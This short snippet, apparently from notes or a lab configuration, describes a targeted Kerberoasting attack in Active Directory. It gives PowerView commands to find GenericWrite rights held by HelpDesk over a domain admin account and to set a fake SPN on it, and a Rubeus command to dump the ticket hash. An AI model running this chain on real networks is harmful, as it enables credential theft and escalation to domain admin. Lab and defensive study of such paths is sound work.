defense.vulnerable_config:
# GenericWrite on DA account by HelpDesk:
Get-ObjectAcl 'DAUser1' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericWrite' -and $_.IdentityReference -match 'HelpDesk'}
# HelpDesk has GenericWrite → can set SPN → targeted Kerberoast

# Set fake SPN on target (requires GenericWrite):
Set-DomainObject -Identity DAUser1 -Set @{serviceprincipalname='fake/dc01'}
# Then: Rubeus.exe kerberoast /user:DAUser1 /outfile:hash.txt
